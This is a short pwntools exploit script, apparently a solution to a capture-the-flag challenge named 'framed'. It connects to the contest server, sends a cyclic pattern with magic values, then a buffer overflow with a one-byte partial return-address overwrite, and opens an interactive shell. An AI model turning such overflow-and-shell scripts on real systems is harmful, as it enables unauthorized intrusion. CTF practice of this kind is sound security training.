#!/usr/bin/env python3

from pwn import *

exe = ELF("./framed")

context.binary = exe


def conn():
        return process([exe.path])


def main():
    #r = conn()
    r = remote("framed.zajebistyc.tf", 17005)
    
    pause()
    r.recvline()
    r.sendline(cyclic_metasploit(0x30) + p32(0xdeadbeef) + p32(0xcafebabe))
    r.recvuntil("How many shuffles?\n")
    r.sendline("0")
    
    for _ in range(2):
        r.recvline()

    r.send(b"M"*0x38 + p8(0x1b))

    r.interactive()


if __name__ == "__main__":
    main()
